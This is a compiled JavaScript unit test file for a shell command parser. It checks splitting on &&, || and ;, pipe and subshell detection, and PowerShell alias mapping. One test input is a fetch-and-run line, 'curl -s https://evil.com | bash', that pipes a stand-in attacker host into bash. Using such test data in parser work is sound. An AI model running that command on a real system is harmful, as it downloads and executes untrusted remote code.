"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
Object.defineProperty(exports, "__esModule", { value: true });
const assert = __importStar(require("assert"));
const commandParser_1 = require("../../src/core/commandParser");
describe('CommandParser Unit Tests', () => {
    it('parses single basic command', () => {
        const res = commandParser_1.CommandParser.parse('git status', 'bash');
        assert.strictEqual(res.segments.length, 1);
        assert.strictEqual(res.segments[0].command, 'git');
        assert.deepStrictEqual(res.segments[0].args, ['status']);
        assert.strictEqual(res.hasSubshells, false);
        assert.strictEqual(res.hasPipes, false);
    });
    it('splits chained commands by operators (&&, ||, ;)', () => {
        const res = commandParser_1.CommandParser.parse('npm run build && npm test || echo "Failed"', 'bash');
        assert.strictEqual(res.segments.length, 3);
        assert.strictEqual(res.segments[0].command, 'npm');
        assert.strictEqual(res.segments[0].operator, '&&');
        assert.strictEqual(res.segments[1].command, 'npm');
        assert.strictEqual(res.segments[1].operator, '||');
        assert.strictEqual(res.segments[2].command, 'echo');
    });
    it('detects pipes properly', () => {
        const res = commandParser_1.CommandParser.parse('curl -s https://evil.com | bash', 'bash');
        assert.strictEqual(res.hasPipes, true);
        assert.strictEqual(res.segments.length, 2);
        assert.strictEqual(res.segments[0].command, 'curl');
        assert.strictEqual(res.segments[0].operator, '|');
        assert.strictEqual(res.segments[1].command, 'bash');
    });
    it('does not split operators inside quotes', () => {
        const res = commandParser_1.CommandParser.parse('git commit -m "feat: handle || and && operators"', 'bash');
        assert.strictEqual(res.segments.length, 1);
        assert.strictEqual(res.segments[0].command, 'git');
        assert.strictEqual(res.segments[0].args[2], 'feat: handle || and && operators');
    });
    it('detects subshells and command substitutions', () => {
        const res1 = commandParser_1.CommandParser.parse('echo $(whoami)', 'bash');
        assert.strictEqual(res1.hasSubshells, true);
        const res2 = commandParser_1.CommandParser.parse('eval "echo malicious"', 'bash');
        assert.strictEqual(res2.hasSubshells, true);
        const res3 = commandParser_1.CommandParser.parse('Invoke-Expression "Get-Process"', 'powershell');
        assert.strictEqual(res3.hasSubshells, true);
    });
    it('normalizes PowerShell aliases', () => {
        const res = commandParser_1.CommandParser.parse('rm -rf ./temp', 'powershell');
        assert.strictEqual(res.segments[0].command, 'Remove-Item');
        const res2 = commandParser_1.CommandParser.parse('del file.txt', 'powershell');
        assert.strictEqual(res2.segments[0].command, 'Remove-Item');
        const res3 = commandParser_1.CommandParser.parse('cat file.txt', 'powershell');
        assert.strictEqual(res3.segments[0].command, 'Get-Content');
        const res4 = commandParser_1.CommandParser.parse('irm https://example.com/script.ps1', 'powershell');
        assert.strictEqual(res4.segments[0].command, 'Invoke-RestMethod');
    });
    it('handles empty or whitespace strings safely', () => {
        const res = commandParser_1.CommandParser.parse('   ', 'bash');
        assert.strictEqual(res.segments.length, 0);
    });
});
//# sourceMappingURL=commandParser.test.js.map